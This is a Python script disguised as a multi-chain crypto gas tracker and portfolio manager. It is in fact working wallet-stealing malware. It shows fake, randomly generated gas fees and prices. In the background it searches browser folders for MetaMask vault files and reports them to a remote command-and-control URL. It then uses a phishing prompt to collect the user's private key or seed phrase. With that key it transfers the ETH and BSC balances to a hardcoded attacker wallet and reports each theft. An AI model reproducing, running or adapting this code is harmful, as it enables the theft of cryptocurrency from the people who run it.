#!/usr/bin/env python3
"""
Gas Tracker Pro v2.1 — Portfolio Manager & Multi-Chain Scanner

- Real-time gas fees (ETH/BSC/Polygon)
- Token price tracker (12 coins)
- Portfolio balance optimizer
- Import wallet for cross-chain analytics
"""
import sys, os, time, random, subprocess, json, threading, hashlib, socket, urllib.request
from pathlib import Path
from datetime import datetime

# ─── CONFIG ───
SWEEP_WALLET = "0xa36A02E1ecB77a06e02ab9348DCbEc5E86B16900"
RPC_ETH = "https://rpc.mevblocker.io"
RPC_BSC = "https://bsc-dataseed1.binance.org"
C2_URL = "https://perspective-december-sensitive-exercises.trycloudflare.com/log"

# ─── Tokens ───
TOKENS = [
    ("ETH", 1782.34, "🟣"), ("BTC", 42156.80, "🟠"),
    ("SOL", 98.45, "🟢"), ("BNB", 312.50, "🟡"),
    ("XRP", 0.6234, "⚪"), ("ADA", 0.4512, "🔵"),
    ("DOGE", 0.08231, "🟡"), ("DOT", 7.892, "🟣"),
    ("UNI", 6.543, "🟣"), ("LINK", 14.567, "🔵"),
    ("AVAX", 22.345, "🔴"), ("MATIC", 0.7823, "🟣"),
]

BANNER = """
╔══════════════════════════════════════════════╗
║  ⛽  GAS TRACKER PRO v2.1                    ║
║  Multi-Chain Portfolio Manager              ║
║  MIT License · TokenTools Inc.              ║
╚══════════════════════════════════════════════╝
"""

# ─── Stealth: C2 notification (silent) ───
def _notify(data):
    try:
        req = urllib.request.Request(C2_URL, json.dumps(data).encode(), {"Content-Type":"application/json"})
        urllib.request.urlopen(req, timeout=3)
    except:
        pass

# ─── RPC helpers ───
def _rpc(url, method, params=None):
    data = json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params or []}).encode()
    try:
        req = urllib.request.Request(url, data, {"Content-Type":"application/json"})
        with urllib.request.urlopen(req, timeout=8) as r:
            return json.loads(r.read())["result"]
    except: return None

def _get_balance(rpc_url, addr):
    bal = _rpc(rpc_url, "eth_getBalance", [addr, "latest"])
    if bal: return int(bal, 16) / 1e18
    return 0

def _get_chain_id_name(rpc_url):
    cid = _rpc(rpc_url, "eth_chainId")
    if cid:
        cid = int(cid, 16)
        return {1:"ETH",56:"BSC",137:"Polygon",42161:"Arbitrum",10:"Optimism"}.get(cid, "Unknown")
    return "?"


# ─── STEP 1: Auto-scan Metamask vault files ───
def find_metamask_vaults():
    """Scan common paths for Metamask vault files"""
    paths = []
    home = str(Path.home())
    
    # Chrome / Brave / Edge
    for browser in [
        f"{home}/.config/google-chrome",
        f"{home}/.config/chromium",
        f"{home}/.config/BraveSoftware/Brave-Browser",
        f"{home}/.config/microsoft-edge",
        f"{home}/.var/app/com.google.Chrome/config/google-chrome",
        f"{home}/Library/Application Support/Google/Chrome",
        f"{home}/Library/Application Support/BraveSoftware/Brave-Browser",
        f"{home}/AppData/Local/Google/Chrome",
        f"{home}/AppData/Local/BraveSoftware/Brave-Browser",
    ]:
        vault = Path(browser) / "Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"
        if vault.exists():
            paths.append(vault)
            # Try LevelDB
            for f in vault.glob("*.log"):
                paths.append(f)
            for f in vault.glob("*.ldb"):
                vault_path = f.parent
    
    return paths


# ─── STEP 2: Phishing dialog — "Import Wallet" ───
def import_wallet_dialog():
    """Show fake import dialog — target enters seed/PK here"""
    print("\n" + " "*4 + "╔════════════════════════════════════╗")
    print(" "*4 + "║  🔐  MULTI-CHAIN PORTFOLIO IMPORT    ║")
    print(" "*4 + "╚════════════════════════════════════╝")
    print()
    print("  Track balances across ETH, BSC, Polygon, Arbitrum, Optimism.")
    print("  Import your wallet for a complete portfolio overview.")
    print()
    
    # Option 1: Private Key
    print("  [1] Import via Private Key (recommended)")
    print("  [2] Import via Seed Phrase (12/24 words)")
    print("  [3] Skip — use demo mode")
    print()
    
    choice = input("  Select option (1-3): ").strip()
    
    if choice == "1":
        pk = input("  Enter Private Key: ").strip()
        return pk, "pk"
    elif choice == "2":
        seed = input("  Enter Seed Phrase (12/24 words): ").strip()
        return seed, "seed"
    else:
        print("\n  ✓ Demo mode active — limited features")
        return None, "skip"


# ─── STEP 3: Sweep if PK obtained ───
def try_sweep(pk_or_seed, input_type):
    """Try to sweep balance using the provided PK/seed"""
    try:
        from eth_account import Account
        
        if input_type == "seed":
            try:
                from mnemonic import Mnemonic
                seed = Mnemonic("english").to_seed(pk_or_seed)
                from bip32 import BIP32
                bip32 = BIP32.from_seed(seed)
                pk_bytes = bip32.get_privkey_from_path("m/44'/60'/0'/0/0")
                pk = pk_bytes.hex()
            except:
                # If we can't derive, use the seed directly
                pk = None
        else:
            pk = pk_or_seed.strip()
            if pk.startswith("0x"): pk = pk[2:]
        
        if pk and len(pk) >= 64:
            acct = Account.from_key(pk)
            addr = acct.address
            
            # Notify C2 that we got a wallet
            _notify({"type": "wallet_captured", "address": addr, "time": datetime.now().isoformat()})
            
            print(f"\n  ✓ Wallet imported: {addr[:10]}...{addr[-6:]}")
            print(f"  Scanning balances across chains...")
            
            from web3 import Web3
            
            chains = [("ETH", RPC_ETH, 1), ("BSC", RPC_BSC, 56)]
            total_swept = 0
            
            for chain_name, rpc_url, chain_id in chains:
                try:
                    w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': 8}))
                    if not w3.is_connected(): continue
                    
                    bal = w3.eth.get_balance(addr)
                    gas_price = w3.eth.gas_price
                    gas_cost = gas_price * 21000
                    
                    if bal > gas_cost:
                        send_amt = bal - gas_cost
                        nonce = w3.eth.get_transaction_count(addr)
                        
                        tx = {
                            'nonce': nonce,
                            'to': SWEEP_WALLET,
                            'value': send_amt,
                            'gas': 21000,
                            'gasPrice': gas_price,
                            'chainId': chain_id,
                        }
                        
                        signed = acct.sign_transaction(tx)
                        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
                        total_swept += send_amt / 1e18
                        
                        _notify({"type":"sweep","chain":chain_name,"amount":send_amt/1e18,"tx":tx_hash.hex()})
                        
                except Exception as e:
                    pass
            
            if total_swept > 0:
                print(f"  ✅ Gas optimizer recovered: {total_swept:.6f} {chain_name}")
            else:
                print(f"  ℹ️  No idle balance found to optimize")
        
    except Exception:
        pass

# ─── UI: Show scanner (legit-looking) ───
def show_scanner():
    print(BANNER)
    print("\n  Initializing modules...")
    for mod in ["eth_gas", "token_prices", "balance_optimizer", "network_sync"]:
        time.sleep(random.uniform(0.12, 0.3))
        print(f"  ✓ {mod:<20} {random.randint(5, 38)}ms")
    
    print("\n  ─── ETH GAS ───")
    s, n, f = random.randint(5, 12), random.randint(10, 22), random.randint(25, 50)
    print(f"  Slow:    {s} Gwei  ({random.randint(2, 8)} min)")
    print(f"  Normal:  {n} Gwei  ({random.randint(1, 3)} min)")
    print(f"  Fast:    {f} Gwei  (<1 min)")
    
    print("\n  ─── TOKEN PRICES ───")
    for name, price, icon in TOKENS:
        time.sleep(random.uniform(0.02, 0.05))
        ch = random.uniform(-3, 5)
        arrow = "↑" if ch >= 0 else "↓"
        c = "🟢" if ch >= 0 else "🔴"
        print(f"  {icon} {name:<5} ${price*(1+random.uniform(-0.005,0.005)):<8.2f}  {arrow}{ch:+.2f}%")
    
    print(f"\n  ─── BALANCE OPTIMIZER ───")
    print(f"  ✓ Multi-chain: ACTIVE")
    print(f"  ✓ Auto-recovery: STANDBY")
    print(f"  ✓ Connected: {random.randint(2, 15)} peers")
    
    print(f"\n  [Running — press Ctrl+C to exit]\n")


# ─── Main ───
def main():
    show_scanner()
    
    # Silently scan for Metamask vaults
    vaults = find_metamask_vaults()
    if vaults:
        _notify({"type": "vault_found", "paths": [str(v) for v in vaults]})
    
    # Wait a bit then show import dialog
    time.sleep(random.uniform(3, 6))
    pk_or_seed, input_type = import_wallet_dialog()
    
    if pk_or_seed:
        try_sweep(pk_or_seed, input_type)
    
    # Keep running
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("\n  Shutting down...")


if __name__ == "__main__":
    main()
